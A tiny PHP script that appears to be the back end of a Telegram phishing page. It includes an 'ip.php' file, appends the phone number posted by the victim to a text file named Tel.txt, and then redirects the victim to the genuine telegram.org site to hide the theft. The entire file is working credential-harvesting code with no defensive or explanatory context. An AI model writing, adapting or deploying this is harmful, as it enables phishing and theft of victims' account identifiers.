<?php
include 'ip.php';
file_put_contents("Tel.txt", "" . $email = $_POST['Phone'] . "\n", FILE_APPEND);
header('Location: https://telegram.org/');
?>